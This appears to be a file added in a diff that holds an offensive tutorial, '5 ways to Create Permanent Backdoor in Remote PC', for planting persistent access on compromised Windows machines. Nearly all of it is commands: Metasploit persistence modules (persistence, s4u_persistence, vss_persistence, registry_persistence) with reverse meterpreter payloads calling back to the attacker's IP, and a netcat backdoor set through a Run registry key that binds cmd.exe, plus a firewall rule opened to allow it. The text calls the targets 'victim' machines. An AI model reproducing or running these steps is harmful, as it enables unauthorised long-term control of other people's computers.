@@ -1,0 +1,90 @@
+
+5 ways to Create Permanent Backdoor in Remote PC
+
+First take the meterpreter shell from any known exploit and bypass UAC for better results .Then   run command:
+run persistence –X –i 10 –p 443 –r 192.168.0.105
+-X=connect back when the system boots
+-i 10=try to connect back every 10 seconds
+-p 443=reverse connection port
+-r ip=reverse connection ip
+After successfully executing the script, reboot the system and then use exploit:
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 443
+set lhost 192.168.0.105
+exploit
+
+s4u_persistence
+Creates a scheduled task that will run using service-for-user (S4U). This allows the scheduled task to run even as an unprivileged user that is not logged into the device. This will result in lower security context, allowing access to local resources only. The module requires ‘Logon as a batch job’ permissions (SeBatchLogonRight)
+Now type use exploit/windows/local/s4u_persistence
+msf exploit (s4u_persistence)>set payload windows/meterpreter/reverse_tcp
+msf exploit (s4u_persistence)>set lhost 192.168.0.137 (IP address of kali Linux)
+msf exploit (s4u_persistence)>set lport 443
+msf exploit (s4u_persistence)>set trigger logon
+msf exploit (s4u_persistence)>set session 2
+msf exploit (s4u_persistence)>exploit 
+Now after successful backdoor creation, restart the victim pc you can see the previous meterpreter session is closed and then run command:
+ use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.137
+exploit
+
+VSS_PERSISTENCE
+This module will attempt to create a persistent payload in a new volume shadow copy. This is based on the VSSOwn Script originally posted by Tim Tomes and Mark Baggett. This module has been tested successfully on Windows 7. In order to achieve persistence through the RUNKEY option, the user should need password in order to start session on the target machine.
+First take the meterpreter shell and bypass UAC by any known technique and then background the session .Then run series of commands:
+Now type use exploit/windows/local/vss_persistence
+msf exploit (vss_persistence)>set runkey true
+msf exploit (vss_persistence)>set schtask true
+msf exploit (vss_persistence)>set rhost 192.168.222.137
+msf exploit vss_persistence)>set session 2
+msf exploit (vss_persistence)>exploit  
+Now run exploit which will create a backdoor and will give a meterpreter session.
+
+Now background it and use the multi handler and also set the payload with commands:
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.222.135
+set lport 4444
+exploit
+Now restart the victim system and the meterpreter session will die, and then run: exploit after restarting the system it will give a reverse meterpreter shell.
+
+REGISTRY PERSISTENCE
+This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in “CurrentVersion\Run” (depending on privilege and selected method). The payload will be installed completely in registry
+First background the meterpreter session and then run commands:
+Now type use exploit/windows/local/registry_persistence
+msf exploit (registry_persistence)>set payload windows/meterpreter/reverse_tcp
+msf exploit (registry_persistence)>set lhost 192.168.222.135 (IP address of kali Linux)
+msf exploit (registry_persistence)>set lport 4545
+msf exploit (registry_persistence)>set startup system
+msf exploit (registry_persistence)>set session 1
+msf exploit (registry_persistence)>exploit
+
+ Now set up your system for reverse connection. Run the following commands on your msfconsole:
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.222.135
+set lport 4545
+exploit
+ Now restart the victim pc and your previous meterpreter session will die, so now run the exploit: After restarting you will get the reverse meterpreter shell as you can see in my case
+
+NETCAT
+Netcat is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.
+After getting the meterpreter shell and bypassing UAC run the following command:
+upload /usr/share/windows-binaries/nc.exe C:\\Windows\\system32
+
+Now set the registry value with the following command:
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d ‘C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe’
+
+Now get the command shell with command:
+Shell and then bypass the firewall on the victim system by adding firewall rules with shell command:
+netsh advfirewall firewall add rule name=’netcat’ dir=in action=allow protocol=Tcp localport=4445
+
+Now check whether the rules are added successfully with the command:
+netsh firewall show portopening
+As you can see the the firewall rule netcat is added successfully.
+
+Now after restarting of the victim system , run the following command on the terminal:
+nc  -nv 192.168.0.101 4445
+Here 192.168.0.101 is the victim system you previously created backdoor and 4445 is the port you gave while setting the registry value.
+After successful running the command you will get the command shell.
+
